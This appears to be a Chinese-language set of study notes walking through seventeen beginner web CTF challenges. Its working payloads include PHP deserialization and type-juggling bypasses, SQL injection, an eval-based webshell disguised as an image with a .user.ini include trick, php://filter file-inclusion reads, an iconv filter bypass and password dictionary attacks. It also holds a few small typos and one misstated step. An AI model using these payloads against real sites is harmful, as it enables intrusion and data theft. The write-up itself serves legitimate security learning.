---
title: "web-low"
data: 2026-03-12
draft: false
weight: 1
---


# 一、低难度
## 1.1 Training-WWW-Robots（Robots）
考察Robots协议，这是一个爬虫的君子协议，规定哪些网站可以访问，哪些不可以访问，该文件一般放在网站的根目录下(`/robots.txt`)
题目还讲述，这些文件也揭示了目录结构
直接URL拼接`/robots.txt`，获得如下信息：
```
User-agent: *
Disallow: /fl0g.php

User-agent: Yandex
Disallow: *
```
URL再拼接`/robots.txt`，获得flag`cyberpeace{40f29ee385120426536014952e9cb9f3}`

## 1.2 PHP2（index.phps）
URL拼接`index.phps`后缀来查看`php`源代码
```PHP
<?php
if("admin"===$_GET[id]) {
  echo("<p>not allowed!</p>");
  exit();
}

$_GET[id] = urldecode($_GET[id]);
if($_GET[id] == "admin")
{
  echo "<p>Access granted!</p>";
  echo "<p>Key: xxxxxxx </p>";
}
?>

Can you anthenticate to this website?
```
如果id用get方法直接传入admin，则会直接退出，将get传入的id进行解码后，如果id=admin，则会输出key
这里采用burpsuite的编码器直接对admin进行url解码，`admin` → `%61%64%6d%69%6e`
URL后缀加入`/?id=%61%64%6d%69%6e`，但拒绝访问，因为url后缀自动变成admin，因此二次url解码，→ `%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65`
成功获得flag`cyberpeace{6493a95c8814ca178d91560aed4993d2}`

## 1.3 unserialize3（反序列化漏洞）
```php
class xctf{
public $flag = '111';
public function __wakeup(){
exit('bad requests');
}
?code=
```
PHP反序列化漏洞场景(CVE-2016-7124)，分析
  - `$flag = '111';`是类中的一个属性
  - `function __wakeup()`是魔术方法，`unserialize()`反序列化函数会检查是否存在`__wakeup`方法，如果存在，则会先调用`__wakeup`方法
  - `exit('bad requests');`这里的`__wakeup`起到了防御作用，一旦尝试反序列化这个类，它会直接终止程序，防止后续代码执行
  - 目前的代码无序列化函数(即：`serialize()`函数，能将内存中的对象转为文本，触发魔术方法：`__sleep()`如果存在)，所以传递参数的时候需要**自己传递已经序列化的参数**，题目提示，传参给code

打开phpstudy，安装`php5.4.45nts`，localhost网站选择这个php版本，接着在`/WWW`目录下创建`serialize.php`文件，内容如下：
```PHP
<?php
class xctf{
    public $flag = '111';
    public function __wakeup(){
        exit('bad requests');
    }
}
$x = new xctf(); // 创建新对象（实例化）
echo(serialize($x)); // 对对象序列化输出
?>
```
`$x`是变量名指向内存中刚刚创建出来的哪个对象
而`new`是关键字，告诉php引擎去内存开启一片空间用于创建一个新的对象实例
`xctf()`是类名，告诉`new`用xctf这张图纸来创建对象，括号`()`代表调用该类的构造函数
因此`$x = new xctf();`产生了一个包含`$flag = '111'`数据的对象实体，`serialize($x)`才能把这个实体转成字符串`0:4:"xctf":1:{...}`

URL中输入`localhost/serialize.php`获得如下结果：`O:4:"xctf":1:{s:4:"flag";s:3:"111";}`，为序列化后的结果
|序列化片段|对应PHP代码成分|说明|
|-|-|-|
|`O:4:"xctf"`|`class xctf`| 标识这个对象属于哪个类|
|`:1:`|属性数量即这里只有一个变量`$flag`|统计类中有多少变量|
|`s:4:"flag"`|`public $flag`|记录变量名字|
|`s:3:"111"`|`= '111'`|记录变量此时的值|

接着在漏洞场景的URL后加上`/?code=O:4:"xctf":1:{s:4:"flag";s:3:"111";}`
得到的结果是`bad requests`，因此，输入这段字符，被反序列化调用了魔法函数，我们需要绕过反序列化
这里的漏洞是：如果在序列化中说明的对象个数要比实际的对象个数大，那么将不会执行`__wakeup()`方法，所以把序列化输出的对象个数改为3，即`/?code=O:4:"xctf":3:{s:4:"flag";s:3:"111";}`
获得flag：`cyberpeace{fbe3a1688219ef9504c05c3be88fef90}`

涉及的知识：
当对象被序列化时，会将对象的属性和属性值存储在序列化的字符串中。
当使用unserialize()函数对序列化的字符串进行反序列化时，PHP会尝试将存储的属性和属性值重新赋值给对象。
当属性个数变大时，PHP的底层逻辑会认为对象已损坏从而跳过魔术方法，但它依然会尽力完成对象的实例化

**流程梳理：**
1. 漏洞分析
类中定义的`__wakeup()`魔术方法包含`exit()`，会在`unserialize()`执行时立即终止程序
而在特定的php版本中，若序列化字符串中表示属性个数的数字大于实际属性个数，PHP会体哦爱国`__wakeup()`的执行
2. 本地payload生成
phpstudy的`WWW`目录下创建`serialize.php`，访问`localhost/serialize.php`得到标准序列化字符串`O:4:"xctf":1:{s:4:"flag";s:3:"111";}`
3. 构造并提交payload
将字符串中的属性个数`1`改为`3`，最终传参`?code=O:4:"xctf":3:{s:4:"flag";s:3:"111";}`，得到flag

## 1.4 ics-06（字典爆破）
云平台报表中心收集了设备管理基础服务的数据，但是数据被删除了，只有一处留下了入侵者的痕迹。
关闭梯子，开启burp suite截取信息，对id=1，这里的`1`注入payload，字典选择数值，从1到3000，最后结果2333有异常，放入重放器，尝试，获得flag
`cyberpeace{4f1481b62f05cd876e8e8485ae75ff92}`

## 1.5 get_post（GET/POST）
问题描述：X老师告诉小宁同学HTTP通常使用两种请求方法，你知道是哪两种吗？
进入页面提示，用GET方式提交a=1的变量，因此URL中加入`/?a=1`
再次提示，用POST方式提交b=2的变量，burp suite抓包
得到：
```HTTP
GET /?a=1 HTTP/1.1
Host: 61.147.171.35:65149
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 Edg/145.0.0.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Connection: keep-alive
```
修改为
```HTTP
POST /?a=1 HTTP/1.1
Host: 61.147.171.35:61795
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 Edg/145.0.0.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 3

b=2
```
获得flag：`cyberpeace{cdea20b31dcec8d40913cde1a93142b7}`

知识总结
  - GET参数本质上是URL的一部分
  - POST参数本质上是HTTP报文体(Body)的内容

## 1.6 backup（目录扫描）
问题：你知道index.php的备份文件名吗？
`index.php~`，但是也让我想起了目录扫描，或许是这类题目最好的解决

flag：`Cyberpeace{855A1C4B3401294CB6604CCC98BDE334}`

进入kali linux，设置成nat模式，使用dirsearch
`dirsearch -u http://目标ip:/端口 -e php,bak,zip`

## 1.7 cookie
F12 → 应用程序 → 存储 → Cookie，获得cookie.php
URL打开，提示`See the http response`，接着打开网络，查看名为`cookie.php`的标头，找到flag：`cyberpeace{ff3da7e18b1452120c8cbc91631baf6d}`

## 1.8 disabled_button（HTML源码修改）
按钮灰色，无法点击
```HTML
<input disabled="" class="btn btn-default" style="height:50px;width:200px;" type="submit" value="flag" name="auth">
```
F12，删除源码中的`disabled`，获得flag`cyberpeace{4d9aa48a8e093c41754d2ebee53f8a39}`
原理是：HTML在浏览器是本地渲染的

## 1.9 weak_auth（字典爆破）
随便输入账户密码，提示账户名为`admin`！
对密码进行爆破，得到密码为`123456`

## 1.10 simple_php（php源码审计）
```PHP
<?php
show_source(__FILE__);
include("config.php");
$a=@$_GET['a'];
$b=@$_GET['b'];
if($a==0 and $a){
    echo $flag1;
}
if(is_numeric($b)){
    exit();
}
if($b>1234){
    echo $flag2;
}
?>
```
先展示当前文件的源代码，再引入配置文件`config.php`
get方式获取a和b，`@`用来抑制变量未定义时的报错，如果a=0且为真，打印flag1，如果b是数字则退出，如果b大于1234，打印flag2

绕过第一个：传入以非数字开头的字符串，当字符串与整数比较（`$a==0`）时，PHP会尝试将字符串转换为数字，如果字符串开头没有数字，那么字符串会被转换为`0`，因此构造payload1：`?a=hi`

绕过第二个，`$b`不能是数字或数字字符串，且数值必须大于1234，PHP在进行数值比较时，会触发自动类型转换，如果字符串以数字开头，它会截取开头的数字部分进行比较，payload2：`?b=1235a`

payload：`?a=hi&b=1235a`

## 1.11 baby_web(重定向)
题目描述：想想初始页面是哪个
bp抓取，修改为index.php，重放发送，结果卡住，排除bp软件问题，这个思路排除
F12，查看网络，访问index.php，发现其状态为302，重定向，点击发现里面有flag

## 1.12 inget(sql注入)
进入后直接提示：`Please enter ID,and Try to bypass`；要求的是通过`ID`参数进行绕过
SQL注入测试：`?id=1'`，页面报错

因此，注入`/?id=1' or '1=1`

知识点：
假设后端服务器原本的SQL查询语句是`SELECT * FROM users WHERE id = '$id';`
那么注入后，拼接结果是`WHERE id = '1' or '1'='1'`，`or '1'='1'`永远成立。
思路是：闭合原有引号、插入`OR`逻辑、添加一个永真式`1=1`

## 1.13 easyupload(文件上传)
### 1.13.1 一般思路
结合题目名字，这里是木马上传的题目，构造`a.jpg`，内容：
`<?php @eval($_POST['a']); ?>`
  - `<?php ...>`是PHP代码的界定符，告诉服务器中间的部需要PHP脚本执行
  - `@`为错误抑制符，不输出错误信息
  - `eval()`将字符串当作PHP代码执行
  - `$_POST['a']`是超全局变量，接收通过HTTP POST请求发送过来的数据
  - 攻击者在本地发送一个POST请求，参数名为`a`，内容为他想执行的代码，服务器收到请求后，`eval()`会把传入的字符串立即变成实时代码运行

提示Your file looks wicked，修改一句话木马，利用短标签绕过
`<?=eval($_POST['a']); ?>`
  - `<?=`是PHP的短打印标签，能直接输出后面表达式的结果
  - `eval()`函数的返回值通常是`null`，所以`<?=`在这里主要不是为了输出，而是为了利用短标签的特性来缩减代码长度，从而躲避某些基于文件长度或关键词的拦截

提示your filetype looks wicked，尝试在构造时加上GIF89a(图片文件头)
```
GIF89a
<?=eval($_POST['a']);?>
```

接着需要用蚁剑连接，但蚁剑需要php文件才可以连接，因此用bp截取信息修改为php，结果提示Your file looks wicked

### 1.13.2 `.user.ini`思路
经过查阅，可以用`.user.ini`文件来解决
知识点：`auto_prepend_file`可以让所有的php文件自动的包含某个文件
例如：在`.user.ini`文件中写入
```
GIF89a
auto_prepend_file=a.jpg
```
然后再`a.jpg`中写入一句话代码，`<?php evla($_POST['a']); ?>`，那么和`.user.ini`和`a.jpg`同一目录下的所有php文件都会包含`a.jpg`

上传`.user.ini`文件，并修改`Content-Type`为图片格式`image/jpg`

尝试蚁剑连接图片路径，URL地址`http://61.147.171.105:57298/uploads/a.jpg`，连接密码`a`，但失败
F12查看流量，发现URL为`http://61.147.171.105:57298/uploads/index.php`，成功，找到flag

## 1.14 file include(文件包含伪协议)
文件包含漏洞：程序在引用外部文件时，未对文件名进行严格过滤，导致攻击者可以控制包含路径，读取敏感文件、执行恶意代码
### 1.14.1 源码分析
F12源码中发现被注释掉的PHP代码
```php
<!--?php
if( !ini_get('display_errors') ) {
  ini_set('display_errors', 'On');
  }//如果当前服务器配置不显示错误，则强制将display_errors开启，这样能将脚本运行的问题显示在浏览器中
error_reporting(E_ALL);	//设置PHP报告所有类型的错误
//以上意思：我要看到所有运行错误

$lan = $_COOKIE['language'];
if(!$lan)
{
	@setcookie("language","english");//向用户的浏览器写入一个cookie，language是cookie名称，english是cookie值
	@include("english.php");//将另一个文件的内容包含（导入）到当前文件中并执行
}//如果用户没有设置名为lanuage的cookie（第一次访问），程序就默认给用户导入值为english的cookie，并包含english.php来显示英文
else
{
	@include($lan.".php");
}//如果用于已经有了cookie，程序会自动拼接上.php，因此可以修改cookie的值，控制include包含任意文件
$x=file_get_contents('index.php');//将index.php里的代码抓取出来，存放在变量$x中
echo $x;
?-->
```

### 1.14.2 PHP的`filter`伪协议
使用php的`filter`伪协议，将目标文件内容进行Base64编码后再输出
构造payload：让`$lan`的值位伪协议语句，由于后端会自动加上`.php`，在payload中不要写后缀
`language=php://filter/read=convert.base64-encode/resource=/var/www/html/flag`
  - `php://filter`是元封装器，让开发者在打开文件流时能够应用特定的过滤器
  - `read=`告诉php，要对读取的数据流进行操作
  - `convert.base64-encode`要求php将读取的文件内容进行Base64编码（防止php引擎解析目标文件的内容，吐过直接包含`flag.php`，php引擎会识别其中的`<?php...?>`，并运行，结果是看不到flag的，只有编码后，对于php引擎来说，这段base64字符串只是一串普通的文本，于是不会运行，）
  - `resource=/var/www/html/flag`指定读取的目标文件路径
  - 注入到`$lan`变量后，服务器实际执行的命令等同于`include("php://filter/read=convert.base64-encode/resource=/var/www/html/flag.php");`
  - `$lan`是如何打印出来的：`include`函数的作用是读取文件内容，且直接输出到HTML页面中

F12，在hackbar中，给cookie注入`language=php://filter/read=convert.base64-encode/resource=/var/www/html/flag`

执行后获得base64编码
`PD9waHANCiRmbGFnPSJjeWJlcnBlYWNle2QyNzY4MDQ4MWRjNzUyNGE1NTM5YWJhM2FlNDEzZjgxfSI7DQo/Pg==`

base64解码后获得
```
<?php
$flag="cyberpeace{d27680481dc7524a5539aba3ae413f81}";
?>
```

## 1.15 fileclude(文件包含伪协议)
```PHP
WRONG WAY! <?php
include("flag.php");
highlight_file(__FILE__);
if(isset($_GET["file1"]) && isset($_GET["file2"]))
{
    $file1 = $_GET["file1"];
    $file2 = $_GET["file2"];
    if(!empty($file1) && !empty($file2))
    {
        if(file_get_contents($file2) === "hello ctf")
        {
            include($file1);
        }
    }
    else
        die("NONONO");
}
```

  - `include()`作用：当前*脚本执行处*包含并运行一个指定文件的代码
  - 如果`$file2`内容为`hello ctf`，那么
  - 利用`$file1`文件包含漏洞执行代码or读取flag

payload构造：
`http://61.147.171.105:53798/index.php?file1=php://filter/read=convert.base64-encode/resource=flag.php&file2=data://text/plain,hello ctf`

  - `php://filter`告诉php，对文件流进行过滤操作
  - `read=convert.base64-encode`是过滤器指令
  - `data://`data协议头，表示后面跟着的是数据本身
  - `text/plain`告诉服务器，这些数据是纯文本格式
  - `,hello ctf`逗号后面是具体内容

`PD9waHAKZWNobyAiV1JPTkcgV0FZISI7Ci8vICRmbGFnID0gY3liZXJwZWFjZXtiNGI5NWY3OTA4ODAwMjI0ZTI2ZGZmYWFkMWI3NTU5OH0=`

```
<?php
echo "WRONG WAY!";
// $flag = cyberpeace{b4b95f7908800224e26dffaad1b75598}
```

## 1.16 easyphp
```PHP
<?php
highlight_file(__FILE__);//__FILE__指向当前执行脚本的绝对路径(包含文件名如C:\www\index.php)，而highlight_file()函数接收到路径，然后去读取文件的文本内容，并使用php语法高亮转换成html代码
$key1 = 0;
$key2 = 0;

$a = $_GET['a'];
$b = $_GET['b'];

if(isset($a) && intval($a) > 6000000 && strlen($a) <= 3){//如果变量$a存在，且其整数值大于600万，且字符串长度不超过3个字符
    if(isset($b) && '8b184b' === substr(md5($b),-6,6)){//如果一个字符串$b，它的MD5值最后6位字符恰好等于8b184b，其中isset($b)检查变量$b是否存在，substr(...,-6,6)表示从字符串倒第六位开始取6个字符
        $key1 = 1;
        }else{
            die("Emmm...再想想");
        }
    }else{
    die("Emmm...");
}



$c=(array)json_decode(@$_GET['c']);//将用户从URL传入的字符串转换成PHP的关联数组，json_decode(...)将JSON格式的字符串转换成PHP对象，(array)将对象强制转为数组
if(is_array($c) && !is_numeric(@$c["m"]) && $c["m"] > 2022){//变量$c是一个数组，其中键名"m"的值不能是数字，且键名"m"在数值比较上要大于2022
    if(is_array(@$c["n"]) && count($c["n"]) == 2 && is_array($c["n"][0])){//变量$c的键名"n"是一个数组，且键名"n"数量为2，且键名"n"的第一个元素为1
        $d = array_search("DGGJ", $c["n"]);//调用array_search()，在数组$c["n"]中寻找字符串"DGGJ"，并把找到的键名赋值为变量$d
        $d === false?die("no..."):NULL;
        foreach($c["n"] as $key=>$val){
            $val==="DGGJ"?die("no......"):NULL;
        }
        $key2 = 1;
    }else{
        die("no hack");
    }
}else{
    die("no");
}


if($key1 && $key2){
    include "Hgfks.php";
    echo "You're right"."\n";
    echo $flag;
}

?> Emmm...
```
  - a，大于600万且字符串长度小于3，7e6
  - b，MD5后六位是8b184b，53724
  - c，包含m（非数字，但大于2022）和n（一个数组，数量为2，第一个元素为1），{"m":"2025a", "n":[[], 0]}
    - c是数字
    - m不能是纯数字
    - m的数值要大于2022
    - n必须是有两个内容的数组
    - n数组里的第一个内容也是数组
    - 在n中能通过弱类型比较找到`DGGJ`
    - 在执行`$d = array_search("DGGJ", $c["n"]);`时，在PHP8.0之前的版本中，用一个数字和一个字符串进行`==`比较时候，php会尝试把字符串转为数字，如果字符串不是以数字开头的，则会强制转换为数字`0`，`0=="DGGJ"`就会变成`0==0`

其中b的结果只能用爆破脚本，因为MD5是不可逆的，只能从0开始一个个数字试
```PHP
<?php
for ( $i = 1; $i < 999999999; $i++ ){
    if ('8b184b' === substr(md5($i),-6,6) ){
        echo($i);
    }
}
?>
```

payload
`?a=7e6&b=53724&c={"m":"2025a", "n":[[], 0]}`

## 1.17 file_include（php本地包含LFI漏洞）
```PHP
<?php
highlight_file(__FILE__);
    include("./check.php");
    if(isset($_GET['filename'])){
        $filename  = $_GET['filename'];
        include($filename);
    }
?>
```
  - `include("./check.php")`大概率是一个黑名单过滤器
构造payload：`?filename=php://filter/read=convert.base64-encode/resource=flag.php`
但提示：do not hack!

尝试各种伪协议数据流过滤器最终采用convert.iconv字符集转换，使用bp进行爆破，记得取消Payload encoding，不需要对内容进行url编码，注意这里要规范格式，在第九行按两次回车，确保光标闪烁在第11行，开始爆破
`GET http://61.147.171.103:60271/?filename=php://filter/convert.iconv.UTF-8.GBK/resource=flag.php HTTP/1.1`
结果`UTF-7`、`UTF-32`，`UTF-8*`、`UTF-32*`这两对长度最大
`http://61.147.171.103:60271/?filename=php://filter/convert.iconv.UTF-7.UTF-32/resource=flag.php`
`http://61.147.171.103:60271/?filename=php://filter/convert.iconv.UTF-8*.UTF-32/resource=flag.php`

最后复查`check.php`
```php
��<�?php if($_GET["filename"]){ $preg_match_username = 'return preg_match("/base|be|encode|print|zlib|quoted|write|rot13|read|string/i", $_GET["filename"]);'; if (eval($preg_match_username)) { die("do not hack!"); } }
```
  - `eval()`函数立即执行`$preg_match_username`
  - 其使用`preg_match`检查通过`filename`传入的字符串，如果匹配到如上内容的关键词(`/i`不区分大小写)，就会执行`die("do not hack!")`